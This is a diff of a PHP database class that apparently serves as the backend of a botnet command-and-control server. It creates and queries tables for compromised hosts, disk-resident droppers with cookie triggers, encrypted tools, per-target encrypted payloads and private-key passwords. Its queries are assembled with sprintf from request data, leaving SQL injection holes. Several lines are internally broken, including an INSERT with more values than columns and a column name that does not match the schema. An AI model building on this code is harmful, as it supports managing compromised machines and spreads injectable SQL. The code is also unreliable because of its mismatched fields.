@@ -14,9 +14,22 @@ use ReturnTypeWillChange;
  */
 class slopPgSql extends PDO
 {
+    protected array $create_tables_run;
+    /**
+     * @var array|string[]
+     */
+    protected array $tables;
+
     function __construct(string | null $dsn, $username = null, $password = null, $options = null)
     {
         $this->allowed_chars = (new \config\defaultConfig)->getAllowedChars();
+        $this->create_tables_run = [];
+        $this->tables = [
+            "main" => "CREATE TABLE IF NOT EXISTS sloppy_bots_main(id SERIAL NOT NULL constraint sloppy_bots_main_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, rhost TEXT UNIQUE NOT NULL, uri TEXT NOT NULL, os_flavor TEXT NOT NULL DEFAULT '-', check_in INTEGER NOT NULL default 0, uuid TEXT NOT NULL DEFAULT '-', agent TEXT NOT NULL DEFAULT '-', cname TEXT NOT NULL DEFAULT '-', cvalue TEXT NOT NULL DEFAULT '-')",
+            "droppers" => "CREATE TABLE IF NOT EXISTS sloppy_bots_droppers(id SERIAL NOT NULL constraint sloppy_bots_slim_droppers_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, location_on_disk TEXT NOT NULL UNIQUE, cookiename TEXT NOT NULL DEFAULT '-', cookievalue TEXT NOT NULL DEFAULT '-', user_agent TEXT NOT NULL DEFAULT '-', dropper_type TEXT NOT NULL DEFAULT '-')",
+            "certs" => "CREATE TABLE IF NOT EXISTS sloppy_bots_certs(id SERIAL NOT NULL constraint sloppy_bots_certs_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, cert_location_on_disk TEXT UNIQUE NOT NULL DEFAULT '-', base64_encoded_cert TEXT UNIQUE NOT NULL DEFAULT '-', csr TEXT UNIQUE DEFAULT '-', pub TEXT UNIQUE DEFAULT '-', pem TEXT UNIQUE DEFAULT '-', cipher TEXT DEFAULT '-', encrypted BOOLEAN DEFAULT false, priv_key_password TEXT NOT NULL DEFAULT '-' UNIQUE)",
+            "tools" => "CREATE TABLE IF NOT EXISTS sloppy_bots_tools(id SERIAL NOT NULL constraint sloppy_bots_tools_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, tool_name TEXT UNIQUE NOT NULL DEFAULT '-', target TEXT NOT NULL DEFAULT '-', base64_encoded_tool TEXT UNIQUE NOT NULL DEFAULT '-', keys TEXT UNIQUE DEFAULT '-', tags TEXT UNIQUE DEFAULT '-', iv TEXT UNIQUE DEFAULT '-', aad TEXT DEFAULT '-',cipher TEXT DEFAULT '-', hmac_hash TEXT UNIQUE DEFAULT '-', lang TEXT DEFAULT '-', encrypted BOOLEAN DEFAULT false)"
+        ];
         if (is_null($dsn)){
             throw new \Exception("[ !! ] DSN cannot be null. [ !! ]");
         }
@@ -69,9 +82,9 @@ class slopPgSql extends PDO
                 }
             case str_contains($data['action'], "add_dropper"):
                 try {
-                    $this->exec(sprintf("INSERT INTO sloppy_bots_droppers(location_on_disk, caller_domain, cookiename, cookievalue, user_agent) VALUES('%s', '%s', '%s', '%s', '%s');",
+                    $this->exec(sprintf("INSERT INTO sloppy_bots_droppers(location_on_disk, cookiename, cookievalue, user_agent) VALUES('%s', '%s', '%s', '%s', '%s');",
                         $data['location_on_disk'],
-                        $data['caller_domain'],
+                        $data['uuid'],
                         $data['cookiename'],
                         $data['cookievalue'],
                         $data['user_agent']
@@ -166,6 +179,11 @@ class slopPgSql extends PDO
     }
     public function grabOrFormatOutput(array $data): PDOStatement | array{
         /** @var string $sqlfrag */
+        if ($this->checkIfInDb($data['bot'])){
+            return [
+                "QueryData" => null
+            ];
+        }
         switch ($data['type']) {
             case str_contains($data['type'], "single_bot") !== false:
                 return $this->grabSingleBot($data['bot']);
@@ -193,19 +211,21 @@ class slopPgSql extends PDO
                 }
                 break;
             case str_contains($data['type'], 'pullSlop') !== false:
-                $sqlfrag = sprintf("SELECT encrypted_contents, pem_used FROM sloppy_deployer WHERE targeted_host = '%s'", $data['rhost']);
+                $sqlfrag = sprintf("SELECT encrypted_contents, pem_used FROM sloppy_deployer WHERE targeted_host = '%s'", $data['bot']);
                 break;
             default:
                 break;
         }
-        return $this->query($sqlfrag);
+        return [
+            "QueryData" => $this->query($sqlfrag)
+        ];
 
     }
 
     private function grabBots(): array{
         return [
             "count" => $this->query("SELECT COUNT(*) FROM (SELECT rhost from sloppy_bots_main WHERE rhost is not null) AS TEMP"),
-            "bots" => $this->query("SELECT rhost, uri, check_in FROM sloppy_bots_main")
+            "bots" => $this->query("SELECT rhost, uri, cname, cval, uuid, agent FROM sloppy_bots_main")
         ];
     }
     private function grabSingleBot(string $bot_id){
@@ -230,14 +250,14 @@ class slopPgSql extends PDO
                 echo "Please annotate this down somewhere. This will be the sloppy_bot password: " . $p . "\n";
                 $this->exec( sprintf("CREATE ROLE sloppy_bot WITH LOGIN ENCRYPTED PASSWORD '%s'", $p));
                 $this->exec( sprintf("GRANT ALL ON ALL TABLES IN SCHEMA public TO %s", get_current_user()));
-                $this->exec( "CREATE TABLE IF NOT EXISTS sloppy_bots_main(id SERIAL NOT NULL constraint sloppy_bots_main_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, rhost TEXT UNIQUE NOT NULL, uri TEXT NOT NULL, os_flavor TEXT NOT NULL DEFAULT '-', check_in INTEGER NOT NULL default 0, uuid TEXT NOT NULL DEFAULT '-', agent TEXT NOT NULL DEFAULT '-')");
-                $this->exec( "CREATE TABLE IF NOT EXISTS sloppy_bots_slim_droppers(id SERIAL NOT NULL constraint sloppy_bots_slim_droppers_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, location_on_disk TEXT NOT NULL UNIQUE, caller_domain TEXT NOT NULL DEFAULT '-', cookiename TEXT NOT NULL DEFAULT '-', cookievalue TEXT NOT NULL DEFAULT '-', user_agent TEXT NOT NULL DEFAULT '-')");
-                $this->exec( "CREATE TABLE IF NOT EXISTS sloppy_bots_domains(id SERIAL NOT NULL constraint sloppy_bots_domains_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, uses INTEGER NOT NULL DEFAULT 0, domain TEXT UNIQUE NOT NULL DEFAULT '-')");
-                $this->exec( "CREATE TABLE IF NOT EXISTS sloppy_bots_tools(id SERIAL NOT NULL constraint sloppy_bots_tools_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, tool_name TEXT UNIQUE NOT NULL DEFAULT '-', target TEXT NOT NULL DEFAULT '-', base64_encoded_tool TEXT UNIQUE NOT NULL DEFAULT '-', keys TEXT UNIQUE DEFAULT '-', tags TEXT UNIQUE DEFAULT '-', iv TEXT UNIQUE DEFAULT '-', aad TEXT DEFAULT '-',cipher TEXT DEFAULT '-', hmac_hash TEXT UNIQUE DEFAULT '-', lang TEXT DEFAULT '-', encrypted BOOLEAN DEFAULT false)");
-                $this->exec( "CREATE TABLE IF NOT EXISTS sloppy_bots_certs(id SERIAL NOT NULL constraint sloppy_bots_certs_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, cert_location_on_disk TEXT UNIQUE NOT NULL DEFAULT '-', base64_encoded_cert TEXT UNIQUE NOT NULL DEFAULT '-', csr TEXT UNIQUE DEFAULT '-', pub TEXT UNIQUE DEFAULT '-', pem TEXT UNIQUE DEFAULT '-', cipher TEXT DEFAULT '-', encrypted BOOLEAN DEFAULT false, priv_key_password TEXT NOT NULL DEFAULT '-' UNIQUE)");
-                $this->exec("CREATE TABLE IF NOT EXISTS sloppy_bots_proxies(id SERIAL NOT NULL constraint sloppy_bots_proxies_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, proxy_schema TEXT NOT NULL DEFAULT '-', proxy TEXT UNIQUE NOT NULL DEFAULT '-', times_used INTEGER NOT NULL DEFAULT 0, last_domain_contacted TEXT NOT NULL DEFAULT '-', proxy_still_viable BOOLEAN NOT NULL DEFAULT TRUE, round_trip_time INTEGER NOT NULL DEFAULT 0, time_outs INTEGER NOT NULL DEFAULT 0, successful_responses INTEGER NOT NULL DEFAULT 0)");
-                $this->exec("CREATE TABLE IF NOT EXISTS sloppy_deployer(id SERIAL NOT NULL constraint sloppy_deployer_pkey,encrypted_contents TEXT NOT NULL,pem_used TEXT NOT NULL DEFAULT 'NONE',targeted_host TEXT NOT NULL, targeted_host TEXT NOT NULL)");
-                $this->exec("GRANT SELECT,INSERT,UPDATE ON sloppy_bots_main,sloppy_bots_certs,sloppy_bots_domains,sloppy_bots_tools,sloppy_bots_proxies,sloppy_bots_slim_droppers TO sloppy_bot");
+                foreach ($this->tables as $tables => $table_sql_frag){
+                    if ($this->exec($table_sql_frag) !== false){
+                        $this->create_tables_run[$tables] = "Successful";
+                    }else {
+                        $this->create_tables_run[$tables] = "Unsuccessful";
+                    }
+                }
+                $this->exec("GRANT SELECT,INSERT,UPDATE ON sloppy_bots_main,sloppy_bots_certs,sloppy_bots_tools,sloppy_bots_slim_droppers TO sloppy_bot");
                 $this->exec("GRANT ALL ON ALL SEQUENCES IN SCHEMA public TO sloppy_bot");
                 // calling this commit to ensure the transaction succeeds, even though we have set autocommit to on.
                 $this->commit();
